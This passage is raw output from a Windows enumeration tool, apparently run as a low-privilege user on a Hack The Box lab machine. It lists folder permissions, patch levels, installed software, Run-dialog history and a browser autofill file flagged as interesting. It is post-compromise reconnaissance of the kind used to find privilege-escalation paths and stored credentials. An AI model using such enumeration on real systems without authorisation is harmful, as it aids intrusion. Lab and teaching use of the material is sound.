  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files (x86)\Microsoft SQL Server\150\DTS\Binn\
  SDDL                           :

  Name                           : C:\Program Files\dotnet\
  SDDL                           : O:BAD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files\Microsoft\Web Platform Installer\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Users\Administrator.HACKTHEBOX\AppData\Local\Microsoft\WindowsApps
  SDDL                           :

  Name                           : %SystemRoot%\system32
  SDDL                           :

  Name                           : %SystemRoot%
  SDDL                           :

  Name                           : %SystemRoot%\System32\Wbem
  SDDL                           :

  Name                           : %SYSTEMROOT%\System32\WindowsPowerShell\v1.0\
  SDDL                           :

  Name                           : %SYSTEMROOT%\System32\OpenSSH\
  SDDL                           :

  Name                           : C:\Users\svc_dev\AppData\Local\Microsoft\WindowsApps
  SDDL                           : O:S-1-5-21-197600473-3515118913-3158175032-1003D:(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;S-1-5-21-197600473-3515118913-3158175032-1003)

====== EnvironmentVariables ======

  <SYSTEM>                           ComSpec                            %SystemRoot%\system32\cmd.exe
  <SYSTEM>                           DriverData                         C:\Windows\System32\Drivers\DriverData
  <SYSTEM>                           OS                                 Windows_NT
  <SYSTEM>                           PATHEXT                            .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  <SYSTEM>                           PROCESSOR_ARCHITECTURE             AMD64
  <SYSTEM>                           TEMP                               %SystemRoot%\TEMP
  <SYSTEM>                           TMP                                %SystemRoot%\TEMP
  <SYSTEM>                           USERNAME                           SYSTEM
  <SYSTEM>                           windir                             %SystemRoot%
  <SYSTEM>                           Path                               C:\Program Files\PHP\v7.3;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\;C:\Program Files (x86)\Microsoft SQL Server\140\Tools\Binn\;C:\Program Files\Microsoft SQL Server\140\Tools\Binn\;C:\Program Files\Microsoft SQL Server\140\DTS\Binn\;C:\Program Files\Microsoft SQL Server\130\Tools\Binn\;C:\Program Files (x86)\Microsoft SQL Server\110\DTS\Binn\;C:\Program Files (x86)\Microsoft SQL Server\120\DTS\Binn\;C:\Program Files (x86)\Microsoft SQL Server\130\DTS\Binn\;C:\Program Files (x86)\Microsoft SQL Server\140\DTS\Binn\;C:\Program Files (x86)\Microsoft SQL Server\150\DTS\Binn\;C:\Program Files\dotnet\;C:\Program Files\Microsoft\Web Platform Installer\;C:\Users\Administrator.HACKTHEBOX\AppData\Local\Microsoft\WindowsApps;;%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\;%SYSTEMROOT%\System32\OpenSSH\
  <SYSTEM>                           PSModulePath                       %ProgramFiles%\WindowsPowerShell\Modules;%SystemRoot%\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\140\Tools\PowerShell\Modules\
  <SYSTEM>                           NUMBER_OF_PROCESSORS               8
  <SYSTEM>                           PROCESSOR_LEVEL                    25
  <SYSTEM>                           PROCESSOR_IDENTIFIER               AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
  <SYSTEM>                           PROCESSOR_REVISION                 0101
  NT AUTHORITY\SYSTEM                Path                               %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
  NT AUTHORITY\SYSTEM                TEMP                               %USERPROFILE%\AppData\Local\Temp
  NT AUTHORITY\SYSTEM                TMP                                %USERPROFILE%\AppData\Local\Temp
  WEB01\svc_dev                      Path                               %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
  WEB01\svc_dev                      TEMP                               %USERPROFILE%\AppData\Local\Temp
  WEB01\svc_dev                      TMP                                %USERPROFILE%\AppData\Local\Temp
====== ExplicitLogonEvents ======

ERROR: Unable to collect. Must be an administrator.
====== ExplorerMRUs ======

====== ExplorerRunCommands ======


  S-1-5-21-197600473-3515118913-3158175032-1003 :
    a          :  cmd\1
    MRUList    :  ab
    b          :  winver\1
====== FileInfo ======

  Comments                       :
  CompanyName                    : Microsoft Corporation
  FileDescription                : NT Kernel & System
  FileName                       : C:\WINDOWS\system32\ntoskrnl.exe
  FileVersion                    : 10.0.17763.6292 (WinBuild.160101.0800)
  InternalName                   : ntkrnlmp.exe
  IsDebug                        : False
  IsDotNet                       : False
  IsPatched                      : False
  IsPreRelease                   : False
  IsPrivateBuild                 : False
  IsSpecialBuild                 : False
  Language                       : English (United States)
  LegalCopyright                 : c Microsoft Corporation. All rights reserved.
  LegalTrademarks                :
  OriginalFilename               : ntkrnlmp.exe
  PrivateBuild                   :
  ProductName                    : Microsoftr Windowsr Operating System
  ProductVersion                 : 10.0.17763.6292
  SpecialBuild                   :
  Attributes                     : Archive
  CreationTimeUtc                : 9/17/2024 1:18:53 PM
  LastAccessTimeUtc              : 9/17/2024 1:18:54 PM
  LastWriteTimeUtc               : 9/17/2024 1:18:54 PM
  Length                         : 9672160
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;0x1200a9;;;SY)(A;;0x1200a9;;;BA)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)

====== FileZilla ======

====== FirefoxHistory ======

====== FirefoxPresence ======

====== Hotfixes ======

Enumerating Windows Hotfixes. For *all* Microsoft updates, use the 'MicrosoftUpdates' command.

  KB5041913  9/17/2024 12:00:00 AM  Update                         NT AUTHORITY\SYSTEM
  KB4523204  1/21/2020 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
  KB4558997  8/6/2020 12:00:00 AM   Security Update                NT AUTHORITY\SYSTEM
  KB4566424  9/14/2020 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
  KB4570332  9/14/2020 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
  KB4577667  10/13/2020 12:00:00 AM Security Update                NT AUTHORITY\SYSTEM
  KB4587735  12/8/2020 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
  KB4589208  9/17/2024 12:00:00 AM  Update                         NT AUTHORITY\SYSTEM
  KB5043050  9/17/2024 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
  KB5043126  9/17/2024 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
====== IdleTime ======

  CurrentUser : WEB01\svc_dev
  Idletime    : 14h:14m:22s:078ms (51262078 milliseconds)

====== IEFavorites ======

Favorites (svc_dev):

  http://go.microsoft.com/fwlink/p/?LinkId=255142

====== IETabs ======

====== IEUrls ======

Internet Explorer typed URLs for the last 7 days


  S-1-5-21-197600473-3515118913-3158175032-1003

====== InstalledProducts ======

  DisplayName                    : Microsoft Edge
  DisplayVersion                 : 128.0.2739.79
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Edge Update
  DisplayVersion                 : 1.3.195.19
  Publisher                      :
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Help Viewer 2.3
  DisplayVersion                 : 2.3.28107
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2013 Redistributable (x64) - 12.0.40664
  DisplayVersion                 : 12.0.40664.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.40.33810
  DisplayVersion                 : 14.40.33810
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : SQL Server Integration Services Singleton
  DisplayVersion                 : 14.0.3002.136
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft .NET Framework 4.6 Targeting Pack
  DisplayVersion                 : 4.6.00081
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
  DisplayVersion                 : 14.24.28127
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft .NET Core SDK 2.1.509 (x64)
  DisplayVersion                 : 2.1.509
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft SQL Server 2016 Analysis Management Objects
  DisplayVersion                 : 13.1.4495.10
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2012 Redistributable (x86) - 11.0.61030
  DisplayVersion                 : 11.0.61030.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2015-2022 Redistributable (x86) - 14.40.33810
  DisplayVersion                 : 14.40.33810.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft SQL Server 2012 Analysis Management Objects
  DisplayVersion                 : 11.4.7001.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.40.33810
  DisplayVersion                 : 14.40.33810.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2022 X86 Additional Runtime - 14.40.33810
   Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Analysis Services OLE DB Provider
  DisplayVersion                 : 15.0.2000.20
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft .NET Framework 4.6 Targeting Pack
  DisplayVersion                 : 4.6.81
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft SQL Server Management Studio - 18.4
  DisplayVersion                 : 15.0.18206.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.40664
  DisplayVersion                 : 12.0.40664
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft SQL Server Data Tools - Visual Studio 2017
  DisplayVersion                 : 14.0.16194.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft SQL Server 2014 Analysis Management Objects
  DisplayVersion                 : 12.2.5556.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161
  DisplayVersion                 : 9.0.30729.6161
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2013 Redistributable (x86) - 12.0.40664
  DisplayVersion                 : 12.0.40664.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : SQL Server Integration Services 2016
  DisplayVersion                 : 13.1.4495.10
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Visual Studio 2017 Isolated Shell for SSMS
  DisplayVersion                 : 15.0.28307.421
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2012 x86 Additional Runtime - 11.0.61030
  DisplayVersion                 : 11.0.61030
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2012 x86 Minimum Runtime - 11.0.61030
  DisplayVersion                 : 11.0.61030
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Help Viewer 2.3
  DisplayVersion                 : 2.3.28107
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft AS OLE DB Provider for SQL Server 2016
  DisplayVersion                 : 13.1.4495.10
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2012 Redistributable (x64) - 11.0.61030
  DisplayVersion                 : 11.0.61030.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Browser for SQL Server 2017
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Integration Services
  DisplayVersion                 : 15.0.1900.63
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.40664
  DisplayVersion                 : 12.0.40664
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : SQL Server Integration Services 2014
  DisplayVersion                 : 12.2.5556.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : SQL Server Integration Services 2012
  DisplayVersion                 : 11.4.7001.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
  DisplayVersion                 : 14.24.28127
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2010  x86 Redistributable - 10.0.40219
  DisplayVersion                 : 10.0.40219
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : SQL Server Integration Services Singleton
  DisplayVersion                 : 15.0.1301.433
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2008 Redistributable - x86 9.0.21022
  DisplayVersion                 : 9.0.21022
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : GDR 2027 for SQL Server 2017 (KB4505224) (64-bit)
  DisplayVersion                 : 14.0.2027.2
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2017 (64-bit)
  DisplayVersion                 :
  Publisher                      :
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2017 (64-bit)
  DisplayVersion                 :
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.40664
  DisplayVersion                 : 12.0.40664
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2017 Setup (English)
  DisplayVersion                 : 14.0.2027.2
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Database Engine Shared
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Shared Management Objects
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 XEvent
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server Management Studio for Reporting Services
  DisplayVersion                 : 15.0.18206.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219
  DisplayVersion                 : 10.0.40219
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft VSS Writer for SQL Server 2017
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Database Engine Services
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Batch Parser
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft ASP.NET Core 2.1.13 Shared Framework (x64)
  DisplayVersion                 : 2.1.13.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2012 x64 Additional Runtime - 11.0.61030
  DisplayVersion                 : 11.0.61030
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft ODBC Driver 13 for SQL Server
  DisplayVersion                 : 14.0.2027.2
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server Management Studio for Analysis Services
  DisplayVersion                 : 15.0.18206.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server Management Studio
  DisplayVersion                 : 15.0.18206.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft .NET Core Host FX Resolver - 2.1.13 (x64)
  DisplayVersion                 : 16.116.28008
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Web Platform Installer 5.1
  DisplayVersion                 : 5.1.51515.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.40664
  DisplayVersion                 : 12.0.40664
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : VMware Tools
  DisplayVersion                 : 12.4.0.23259341
  Publisher                      : VMware, Inc.
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2022 X64 Additional Runtime - 14.40.33810
  DisplayVersion                 : 14.40.33810
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161
  DisplayVersion                 : 9.0.30729.6161
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft .NET Core SDK 2.1.509 (x64)
  DisplayVersion                 : 8.127.25855
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft .NET Core Host - 2.1.13 (x64)
  DisplayVersion                 : 16.116.28008
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Active Directory Authentication Library for SQL Server
  DisplayVersion                 : 15.0.1300.359
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Shared Management Objects
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft ODBC Driver 17 for SQL Server
  DisplayVersion                 : 17.4.1.1
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft OLE DB Driver for SQL Server
  DisplayVersion                 : 18.7.4.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Database Engine Shared
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127
  DisplayVersion                 : 14.24.28127
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127
  DisplayVersion                 : 14.24.28127
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SSMS Post Install Tasks
  DisplayVersion                 : 15.0.18206.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Connection Info
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Shared Management Objects Extensions
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2016 LocalDB
  DisplayVersion                 : 13.1.4001.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Windows Cache Extension 2.0 for PHP 7.3 (x64)
  DisplayVersion                 : 2.0.8
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server Management Studio
  DisplayVersion                 : 15.0.18206.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : IIS URL Rewrite Module 2
  DisplayVersion                 : 7.2.1993
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Common Files
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2012 Native Client
  DisplayVersion                 : 11.4.7462.6
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Connection Info
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 XEvent
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Web Deploy 4.0
  DisplayVersion                 : 10.0.1994
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2017 RsFx Driver
  DisplayVersion                 : 14.0.2027.2
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Common Files
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.40.33810
  DisplayVersion                 : 14.40.33810
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2012 Native Client
  DisplayVersion                 : 11.4.7001.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 DMF
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Analysis Services OLE DB Provider
  DisplayVersion                 : 15.0.2000.20
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Shared Management Objects Extensions
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2017 T-SQL Language Service
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2012 x64 Minimum Runtime - 11.0.61030
  DisplayVersion                 : 11.0.61030
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 DMF
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft .NET Core Runtime - 2.1.13 (x64)
  DisplayVersion                 : 16.116.28008
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Database Engine Services
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 SQL Diagnostics
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

====== InterestingFiles ======


Accessed      Modified      Path
----------    ----------    -----
2024-09-19    2024-09-05    C:\Users\svc_dev\AppData\Local\Microsoft\Edge\User Data\Autofill\4.0.1.3\autofill_bypass_cache_forms.json
====== InterestingProcesses ======

    Category     : interesting
    Name         : powershell.exe
    Product      : PowerShell host process
    ProcessID    : 7264
    Owner        : WEB01\svc_dev
    CommandLine  : powershell

    Category     : interesting
    Name         : powershell.exe
    Product      : PowerShell host process
    ProcessID    : 5288
    Owner        : WEB01\svc_dev
    CommandLine  : powershell

    Category     : interesting
     Product      : Command Prompt
